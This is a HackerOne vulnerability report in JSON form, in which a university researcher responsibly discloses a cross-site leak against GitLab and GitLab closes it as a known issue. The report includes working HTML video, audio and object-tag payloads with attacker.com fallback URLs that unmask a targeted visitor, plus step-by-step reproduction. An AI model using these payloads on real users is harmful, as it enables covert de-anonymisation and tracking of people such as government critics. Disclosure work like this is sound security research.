{
    "id": 1089914,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDg5OTE0",
    "url": "https://hackerone.com/reports/1089914",
    "title": "Responsible Disclosure of Privacy Leakage Issue",
    "state": "Closed",
    "substate": "informative",
    "severity_rating": "high",
    "readable_substate": "Informative",
    "created_at": "2021-01-28T21:21:20.313Z",
    "submitted_at": "2021-01-28T21:21:20.380Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "mzaheri",
        "url": "/mzaheri",
        "profile_picture_urls": {
            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 264,
        "url": "https://hackerone.com/gitlab",
        "handle": "gitlab",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "open",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "GitLab",
            "twitter_handle": "gitlab",
            "website": "https://about.gitlab.com",
            "about": "A single application for the entire software development lifecycle."
        }
    },
    "has_bounty?": false,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [],
    "singular_disclosure_disabled": true,
    "disclosed_at": "2021-06-29T06:31:08.419Z",
    "bug_reporter_agreed_on_going_public_at": "2021-06-07T01:20:49.567Z",
    "team_member_agreed_on_going_public_at": "2021-06-29T06:31:08.284Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "Greetings,\n\nI am Mojtaba Zaheri, a doctoral candidate in Computer Science, affiliated with the [NJIT Cybersecurity Research Center](https://centers.njit.edu/cybersecurity/welcome/). Together with my doctoral dissertation advisor, Prof. Reza Curtmola, we are reaching out to perform responsible disclosure of a vulnerability present on the GitLab website. Please let us know if you have any comments regarding this disclosure.\n\n### Summary:\nWe have identified a leaky resource attack against several high-profile resource-sharing websites, including GitLab, that allows an attacker to infer the unique identity of a victim that visits an attacker-controlled website. This targeted privacy attack can have a significant impact on the privacy of individuals.\n\nEven though previous work introduced the attack using images (i.e., leaky images [1]), in this report we show that the attack works with any resource that can be privately shared with the victim and can be rendered on a webpage. In particular, we show the attack also works with other media files, such as video and audio files. Thus, we generically refer to the attack as a leaky resource attack. An attacker exploiting these vulnerabilities can identify a user of the GitLab website while the user visits an attacker-controlled website, using the cookie(s) set by the GitLab website in her browser.\n\nThe leaky image attack [1] leverages the existence of a state-dependent URL (SD-URL) on the image-sharing website, i.e. a URL for which the response is different depending on the victim’s state with respect to the image-sharing website. For example, if the user is the targeted victim, the content will be loaded, otherwise, it will not be loaded. The attacker can learn information about this response based on an XS-leak that bypasses the Same-Origin Policy which normally prevents the attacker from reading the contents of a cross-origin response. [1] describes script-based and scriptless variants of the leaky image attack. The scriptless variant relies on the object HTML tag for the XS-leak, using this tag’s if-then-else behavior to enable the attack.\n\nWe reveal a new SD-URL for resources in the GitLab service and introduce two new HTML-only XS-Leaks. We show that a leaky resource attack can be performed using video and audio HTML tags. The previously known scriptless attack was based on the object HTML tag, but we find that it is not reliable: It does not work against all vulnerable resource-sharing services and only works in some browsers. As opposed to this, we show that attacks based on the video and audio tags are very reliable, as they work against all the vulnerable services we identified and across all browsers we tested with (Firefox, Edge, Chrome).\n\nWe describe below the threat model, the exploit vector, and the actual steps that need to be followed on your website to set up a leaky resource attack. We also explain potential fixes.\n\n### Threat Model:\nWe consider attackers that can bring together the following necessary ingredients for a successful leaky resource attack:\n1. The attacker and the victim are users of the same resource sharing service.\n2. The resource sharing service allows its users to share resources privately with each other and authenticates users through cookies.\n3. The attacker convinces the victim to visit the attack page (which is controlled by the attacker) while the victim is logged into her account with the resource sharing service (which is not controlled by the attacker).\n4. The attacker can determine if the victim loaded the resources successfully.\n\nThe attack is effective because these requirements can be achieved in multiple ways and are within easy reach of the attacker. For requirement #1, GitLab is popular, so the victim may have an account; also, GitLab has free membership, and so the attacker can just create an account. For requirement #2, these are the de facto mechanisms for many of the resource sharing services. Requirement #3 can be achieved in multiple ways, including via phishing emails, or via a watering-hole approach. It is common for a large portion of internet users to be logged in to GitLab when they are surfing the internet. Requirement #4 is crucial for the attack and can be achieved as follows. The attack page contains a state-dependent URL (SD-URL) that points to content on the target website (i.e., GitLab). When a user makes a request for the SD-URL, the response is different depending on the user's state with respect to the GitLab website. For example, if the user is the targeted victim, the content will be loaded, otherwise, it will not be loaded. The attacker can learn information about this response based on an XS-leak that bypasses the Same-Origin Policy which normally prevents the attacker from reading the contents of a cross-origin response.\n\n### Attacks:\nThe new SD-URL we use can be exploited by a script-based XL-leak, but here we focus on scriptless XS-leaks, as privacy-aware users may disable scripts or use protection mechanisms that prevent script-based XS-leaks.\n\nThe pattern of the SD-URL used is:\n```\nhttps://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}\n```\nThis SD-URL is valid until the resource is unshared or deleted.\n\nExploiting this SD-URL based on object tag HTML-only XS-Leak from [1]:\n```\n<object data =\"https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}\" type =\"image/png\">\n             <object data =\"Fallback-URL\" type =\"image/png\"></object>\n</object>\n```\nCommunication method using the object HTML tag: If the outer object element (SD-URL) fails to load, then the fallback is to load the inner object element (Fallback-URL, controlled by the attacker). This fallback-based mechanism can be used to simulate an if-then-else control flow instruction in pure HTML. The attack does not work with browsers we tested (Chrome 87.0, Edge 87.0, and Firefox 83.0).\n\nHere we describe the video and audio HTML tags as new XS-leaks that are reliable across all browsers we tested (Chrome 87.0, Edge 87.0, and Firefox 83.0).\n```\n<video width=\"320\" height=\"240\" controls autoplay muted>\n        <source src=\"https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}\" type =\"video/webm\">\n        <source src=\"Fallback-URL\" type =\"video/webm\">\n</video>\n```\nCommunication Method using video HTML tag: If the first source (SD-URL) cannot be loaded, then the fallback is to load the second source (Fallback-URL, controlled by the attacker).\n```\n<audio width=\"320\" height=\"240\" controls autoplay>\n         <source src=\"https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}\" type =\"audio/ogg\">\n         <source src=\"Fallback-URL\" type =\"audio/ogg\">\n</audio>\n```\nCommunication Method using audio HTML tag: If the first source (SD-URL) cannot be loaded, then the fallback is to load the second source (Fallback-URL, controlled by the attacker).\n\nNormally, the source elements are used by website authors to specify multiple alternative media resources for media elements. However, these alternatives can be used to trigger a fallback behavior that mimics an if-then-else control flow. Both resources used in these tests have the type webm and ogg for video and audio tags respectively, but other video and audio file types can be used as well. By checking the HTTP Request Headers, the attacker can make sure whether the specific file type is supported by the browser, and so prepare an appropriate webpage.\n\n### Steps to Reproduce:\nThe attacker first shares privately a resource with the target victim using a sharing service. The attacker then embeds a link to the privately shared resource on a webpage she controls. When a visitor loads that webpage, the resource will be successfully retrieved only if the visitor is the targeted victim, since only the victim is allowed to retrieve the resource (assuming the victim's browser is logged into the sharing service). By observing the success of loading the resource through an XS-leak, the attacker will know if the intended victim has visited the attacker's website.\n\n1) Upload and share privately the resource with the victim in GitLab.\n2) Open the resource in the browser to get the SD-URL.\n3) Embed the SD-URL in an attacker-controlled webpage with an XS-leak.\n\n### Fix:\n1.       Server-side defense:\nThe SameSite cookie attribute can be used to impose restrictions when cookies can be sent. Although setting this cookie attribute to strict or lax could limit the attack surface in theory, our findings show that many popular sharing services are still vulnerable, because the attribute is either set to none or not enabled at all. A major reason for this is that the SameSite cookie attribute interferes with services provided by websites. Two examples are a watch later button on a YouTube video embedded in a non-YouTube website, and a website that embeds the GoogleMaps service, in order to show user-specific resources, such as saved and favorite locations on the map. As an additional drawback, when the SameSite attribute is not set, browsers have inconsistent default behaviors. Chromium-based browsers versions 80 and above treat cookies as if a lax SameSite attribute is set, whereas Firefox (tested up to version 83) treats them as if SameSite is set to none.\n\n2.       Client-side defense:\nWe have devised a client-side defense that can be implemented as a browser extension and can thus be deployed immediately without buy-in from websites and browser vendors. The defense is included in a research article that is currently under submission for publication at an academic conference.\n\n### References:\n[1] Staicu, C.A., Pradel, M.: Leaky images: Targeted privacy attacks in the web. In: Proc. of the 28th USENIX Security Symposium. pp. 923-939 (2019)\n\n## Impact\n\nThe leaky resource attack is a targeted privacy attack, in which an individual browsing an attacker-controlled webpage can be uniquely identified. This is in contrast with other known de-anonymization techniques, such as third-party tracking (e.g., tracking pixels or tracking IPs) or social media fingerprinting, that do not provide this level of accuracy. As such, leaky resources can be abused in a variety of privacy-sensitive scenarios, including law enforcement gathering evidence regarding the online activity of individuals, oppressive governments tracking political dissidents, de-anonymizing reviewers for a conference paper, blackmailing individuals based on their online activity, or health insurance companies discriminating individuals based on their online activity.",
    "weakness": {
        "id": 46,
        "name": "Privacy Violation"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [],
    "allow_singular_disclosure_at": null,
    "vote_count": 7,
    "voters": [
        "ibring",
        "akashhamal0x01",
        "niked",
        "hiking_hacker",
        "meispi",
        "ekgaribadmi",
        "mzaheri"
    ],
    "severity": {
        "rating": "high",
        "author_type": "User"
    },
    "structured_scope": {
        "databaseId": 18138,
        "asset_type": "URL",
        "asset_identifier": "gitlab.com",
        "max_severity": "critical"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 10515920,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hi @mzaheri,\n\nThank you for submitting this report! We will investigate the issue as soon as\npossible, and should get back within a week.\n\nPlease do not submit your report or ask about its status through additional\nchannels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n",
            "automated_response": true,
            "created_at": "2021-01-29T11:19:19.494Z",
            "updated_at": "2021-01-29T11:19:19.494Z",
            "actor": {
                "username": "gitlab-securitybot",
                "cleared": false,
                "verified": false,
                "url": "/gitlab-securitybot",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10517458,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugNeedsMoreInfo",
            "message": "Hello @mzaheri ,\n\nThank you for your report. Could you please provide us with a clear step-by-step on how to exploit that bug? Usually a PoC is welcome in order to demonstrate your vulnerability.\n\nWe recommend using a self-hosted instance for testing purposes and avoir disrupting production on gitlab.com.\n\nThanks and best regards,\nVitor\nSecurity Team | GitLab Inc.",
            "automated_response": false,
            "created_at": "2021-01-29T13:01:53.502Z",
            "updated_at": "2021-01-29T13:01:53.502Z",
            "actor": {
                "username": "vdesousa",
                "cleared": false,
                "verified": false,
                "url": "/vdesousa",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10544322,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugNew",
            "message": "Hi,\n\nTo answer your question, consider a scenario where the attacker knows the victim and the victim’s GitLab account. Using the leaky resource attack, the attacker will have confirmation that the victim visited a specific website. **The victim has a reasonable privacy expectation (i.e., to not be uniquely identified) when browsing arbitrary websites on the web.** However, the leaky resource attack will enable the attack to uniquely identify the victim that visits a website, something that would not be possible otherwise.\n\nConsider a privacy-sensitive scenario involving journalists and critics of the government. A leaky resource attack can help reveal the identity of a government critic who wants to remain anonymous.\n\nAssume the attacker (e.g., an oppressive government entity) knows the GitLab account of the victim. The attacker shares a resource with the victim in GitLab. Then, the attacker embeds the GitLab SD-URL to this resource in an attacker-controlled webpage using the XS-leaks described in the initial report. Finally, when the targeted critic visits the attack webpage leaving negative comments about the government, the attacker will learn the identity of the critic based on the successful request to the SD-URL. The critic has an expectation that comments can be posted anonymously, but in reality, the attacker can uniquely identify the critic.\n\nThe attack can be extended to target a group of victims by sharing individual resources on GitLab with each victim, so that each of these victims can be uniquely identified when visiting some attacker-controlled website. Also, there are a variety of other privacy-sensitive scenarios where the attack will be impactful, including law enforcement gathering evidence regarding the online activity of individuals, oppressive governments tracking political dissidents, de-anonymizing reviewers for a conference paper, blackmailing individuals based on their online activity, or health insurance companies discriminating individuals based on their online activity.\n\nHere are the detailed steps to reproduce the issue:\n\n1. Upload and share privately the resource with the victim in GitLab.\nAttacker owns an account in GitLab platform, initiates a private repository in her account and pushes the resources to the repository. Then the attacker makes the victim a member of the repository (e.g. Maintainter).\n\n2. Open the resource in the browser to get the SD-URL.\nThe attacker extracts the SD-URL to the resource from the GitLab website, with the pattern explained above.\n\n3. Embed the SD-URL in an attacker-controlled webpage with an XS-leak.\nFollowing is an example of XS-Leak:\n```\n<video width=\"320\" height=\"240\" controls autoplay muted>\n        <source src=\"https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}\" type =\"video/webm\">\n        <source src=\"Fallback-URL\" type =\"video/webm\">\n</video>\n```\n\nIf the user visiting the attacker-controlled webpage is not the targeted victim, the response will be an HTTP error or an error webpage. In both cases, the response is not the requested resource type, so the Fallback-URL will be requested by the browser. Hence, the attacker will understand this user is not the targeted victim. However, if the request to the SD-URL is successful, the Fallback-URL is not requested, and so the attacker will understand the current user visiting the attacker website is the targeted victim.\n\nAs a PoC, we hosted an attacker controlled webpage at web.njit.edu:\n* Attacker controlled webpage with the embedded video tag as XS-Leak: https://web.njit.edu/~mz334/GitLabVideo.html\n* Fallback-URL: https://web.njit.edu/~mz334/Volcano_Lava_Sample.webm\n\nIf the user visiting the webpage is the target victim, the request to the SD-URL will be successful (gl1.png in attachment). But, if the user visiting the webpage is not the target victim, the Fallback-URL will be requested (gl2.png in attachment).\n\nSincerely,\nMojtaba\n",
            "automated_response": false,
            "created_at": "2021-02-01T22:37:57.904Z",
            "updated_at": "2021-02-01T22:37:57.904Z",
            "actor": {
                "username": "mzaheri",
                "cleared": false,
                "verified": false,
                "url": "/mzaheri",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "attachments": [
                {
                    "id": 1180281,
                    "filename": "gl1.png",
                    "type": "image/png",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0bc9hyx4jz187s14lh8cs6iyh87p?response-content-disposition=attachment%3B%20filename%3D%22gl1.png%22%3B%20filename%2A%3DUTF-8%27%27gl1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070955Z&X-Amz-Expires=741&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=184a98eeb0347bda63fb340afc4e206c9421fd2427b749b34de4562fdba2fdd8"
                },
                {
                    "id": 1180280,
                    "filename": "gl2.png",
                    "type": "image/png",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5cz7y9897abnfhiy08ny084k5maq?response-content-disposition=attachment%3B%20filename%3D%22gl2.png%22%3B%20filename%2A%3DUTF-8%27%27gl2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUR2ZSYPL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070955Z&X-Amz-Expires=741&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCuJ7GGKM7kIZUlE%2BEjrt%2Bxv5BG%2Fd%2F6MZdNdXaAdLbypAIgWhnU6okSPCcwU2VK%2BkQwglklOGyuwTSp8e0XgpiaTsMquwUImv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDCxq6aFU7nsH%2B6tVECqPBYfRIb1SThCbd1maLSA%2Bz34g%2Bwh%2B0kLpyIzK8gI1I376Nfiqm4jzHZin%2Fi1t9CbVntbcdVUKpl5LBomGC0biywH2qmIDQYHf%2B4Ivdm4qJgeYjBFkVjXXaGrGIHVjm4Qm5vbSgTAqTkhTdRAkAkbHHUGl2LTf5yXK8qQ3MO9rzxQ6jcKMn31IIHPSGMpQ8Pc%2ByHvNCTtzjjy2Fj1BGiWx9r9MQ82VbipBPKywpGx71D3bfxbOAIe6jbk6DN60zvDpMZh%2BbhfkjNXMqCjkTt6chd2%2BmdWqYwN7tjqN7hCnmfKFcO%2FZM%2FND7d9ihU14L0e7fUYaP9ttwDTRSzHNWQKhbLdIPUeCkr6jUknEaom4MsGV6hp5FRyrmf5XaSLIQPROIveYcyCmH%2B9bLkSG1%2FJc%2Byha0BDRydwqtkJHgGPwKFhoo5yPxGKyyanGWMmNXfmPMV%2FBnO2i3nUNmQVRz009ACtL1aWD3LFdxWCn3GN8UA1%2Frjv8TCFgaXA7ZjUtQqf%2Bg1B%2F0mfgiZ9PxUj%2BR2XNIQO3RfPKE0b6uQdmnu85EJrWcIccSqndUSSZrGk%2F4%2FkGYD1Etg6l6IlQqxLOqGwJiYjjI6lf74d71xjdgh2l4pP8QOknOj%2Fyr7CkHtRRt0ujdKmW0BwwkJXxuYSdnQJTyFsVChUZGVXmTiRbYiizTg8sJf6YYQHNXgWw4Oh1KhYXFgQbHVcs%2FX95SDxAlFiOOE08k9RSYETfDpIwmwEkyAyLcBJCcD%2Bsu2hhI%2Fit1J%2BktZAnq9eCTmWVsPM9tXGsX1b0jSb9sb6lecY6usDkO0tuAdnZ0%2B8pbrZuVqjyTKfdZL4aeZIuOlTLkpr7OsCUEQ8aEJGJZx8at6H5wF1mYnIwyYK1pwY6sQHa9NWtSr124WBteOMuZ0gRxs4h7%2B45MQ4Jajx54ZYNp3CzErjQsi074sjhlC%2BgUdUkdv9AJ%2FXnIjscPmbEAOBS1ezvurw3cyM4cDGTs0DFCEF4mtFK3UsBx8CsE0ACWlzoXkcfZWltI2e4mWNuLQrhAKsm7Lpp2%2B23Qc88gL8I%2BFFlGmA68WBDP9ucnEldjgnESenwlTYaBCrPUv9ZnIwNPzlW5RAFvpGY%2BRPFLPWOHC0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d29c2daef951169518ccb92ac93e5b28af5a65e073b1d9c6d229b34518941e5c"
                }
            ],
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10676396,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugNeedsMoreInfo",
            "message": "Hello @mzaheri ,\n\nthanks for your reply. Accessing your URL always gives me the video that starts with \"USGS\" text.\n\nCould you please provide a detailed step-by-step on how to reproduce this vulnerability, including the project settings require?\n\nThanks and best regards,\nVitor\nSecurity Team | GitLab Inc.",
            "automated_response": false,
            "created_at": "2021-02-15T14:39:17.527Z",
            "updated_at": "2021-02-15T14:39:17.527Z",
            "actor": {
                "username": "vdesousa",
                "cleared": false,
                "verified": false,
                "url": "/vdesousa",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10691333,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugNew",
            "message": "Hi Vitor,\n\nYour observation is expected by the attack. When you open the webpage hosted at njit.edu (which is an example of the attacker controlled website), the webpage makes a request to a resource shared privately with the victim in the GiLab website (the video with the “Six Steps” text). However, since you are not the target victim of this attack, the request is not successful and hence the fallback url to a resource hosted at njit.edu is called (the video with “USGS” text). By receiving a request to the fallback url, the attacker will have a confirmation that you are not the target victim. However, if you were the target victim, the attacker will not receive the fallback request, confirming that you are the targeted victim.\n\nHere are the steps to fully reproducible this privacy concern:\n1: Create two user accounts on GitLab website, one for the attacker and one for the victim.\n2: Create a private repository in the attacker account (set the visibility in the project settings to private). Add a video resource to this private repository (leak.webm, the video shown in attachment with “Six Step” text). We call the url pointing to this resource a SD-URL, since success of loading the resource  by this url depends on the user state.\n3: Invite the victim to this private project as a member (e.g. developer), and the victim accepts this invitation.\n4: Host another video resource on the attacker website; attacker.com/fallback.webm. This resource is used as fallback, when the user loading the attacker webpage is not the target victim.\n5: Create a webpage and embed the SD-URL and Fallback URL as shown below:\n\n```\n<html>\n    <head>\n        <title>Leaky Resource Attacks</title>\n    </head>\n    <body>\n        <h3>GitLab Video:</h3>\n        </br>\n        <video width=\"320\" height=\"240\" controls autoplay muted>\n            <source src=\"https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/leak.webm\" type=\"video/webm\">\n            <source src=\"https://attacker.com/fallback.webm\" type=\"video/webm\">\n        </video>\n        </br>\n        </br>\n    </body>\n</html>\n```\nThe webpage can be hosted in an attacker controlled website attacker.com, or for testing purposes can be done by loading from your local file system as well.\n\n6: Load the webpage in your browser in two states:\n* Logged in as the victim; the leak.webm resource will be loaded (video with “Six Steps” text), and hence the request to fallback.webm is not made, confirming this is the targeted victim, and results in successful deanonymization.\n* Not logged in, or logged in as a user other than victim and attacker; the leak.webm resource will not be loaded and consequently the fallback.webm resource will be loaded (video with “USGS” text), confirming this is not the targeted victim.\n\nBest regards,\nMojtaba",
            "automated_response": false,
            "created_at": "2021-02-16T21:42:21.410Z",
            "updated_at": "2021-02-16T21:42:21.410Z",
            "actor": {
                "username": "mzaheri",
                "cleared": false,
                "verified": false,
                "url": "/mzaheri",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10850487,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugInformative",
            "message": "Hello @mzaheri ,\n\nThanks for your answer. After checking internally, this is a [known issue](https://gitlab.com/gitlab-org/gitlab/-/issues/291090). The engineering team cannot change the SameSite cookie for now because of an integration issue with Jira.\n\nWe are closing this report as `Informative`. If you have any comments or questions, please feel free to reply.\n\nLooking forward for your next report.\n\nBest regards,\nVitor\nSecurity Team | GitLab Inc.",
            "automated_response": false,
            "created_at": "2021-03-02T10:15:53.592Z",
            "updated_at": "2021-03-02T10:15:53.592Z",
            "actor": {
                "username": "vdesousa",
                "cleared": false,
                "verified": false,
                "url": "/vdesousa",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10951182,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2021-03-10T22:24:09.805Z",
            "updated_at": "2021-03-10T22:24:09.805Z",
            "first_to_agree": true,
            "actor": {
                "username": "mzaheri",
                "cleared": false,
                "verified": false,
                "url": "/mzaheri",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 10951997,
            "is_internal": false,
            "editable": false,
            "type": "Activities::CancelledDisclosureRequest",
            "message": "canceled the request for now.",
            "automated_response": false,
            "created_at": "2021-03-11T00:36:32.875Z",
            "updated_at": "2021-03-11T00:36:32.875Z",
            "actor": {
                "username": "mzaheri",
                "cleared": false,
                "verified": false,
                "url": "/mzaheri",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 11071713,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "We plan to publish a description of the vulnerability at an academic security conference and notify you as part of a responsible disclosure process. We will be happy to coordinate any public release of this information with you, and in turn, would be happy to receive feedback on whether and when you plan to address the problem.\n\nRegards,\nMojtaba",
            "automated_response": false,
            "created_at": "2021-03-22T01:24:46.598Z",
            "updated_at": "2021-03-22T01:24:46.598Z",
            "actor": {
                "username": "mzaheri",
                "cleared": false,
                "verified": false,
                "url": "/mzaheri",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 12000821,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2021-06-07T01:20:49.591Z",
            "updated_at": "2021-06-07T01:20:49.591Z",
            "first_to_agree": true,
            "actor": {
                "username": "mzaheri",
                "cleared": false,
                "verified": false,
                "url": "/mzaheri",
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "gitlab"
        },
        {
            "id": 12280158,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Hello @mzaheri ,\n\nWe are fine in disclosing this report since the issue is already public.\n\nBest regards,\nVitor\nSecurity Team | GitLab Inc.",
            "automated_response": false,
            "created_at": "2021-06-29T06:12:50.269Z",
            "updated_at": "2021-06-29T06:12:50.269Z",
            "actor": {
                "username": "vdesousa",
                "cleared": false,
                "verified": false,
                "url": "/vdesousa",
